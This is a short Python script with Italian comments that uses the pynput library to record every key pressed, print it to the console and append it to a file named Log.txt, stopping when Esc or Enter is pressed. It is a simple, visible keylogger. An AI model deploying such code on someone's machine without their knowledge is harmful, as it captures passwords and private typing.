from pynput import *

#Funzione per quando si preme un tasto sulla tastiera
def on_press(key):
    print("Hai premuto il tasto: " + str(key))

    
    #2 linee di codice per inserire le chiavi digitate in un file .txt chiamato Log
    file = open("Log.txt", "a")

    file.write(str(key))
    
    #if statement per fermare il programma quando si preme esc o invio
    if key == keyboard.Key.esc or key == keyboard.Key.enter:
        return False                            

#Funzione per quando si rilascia un tasto sulla tastiera
def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
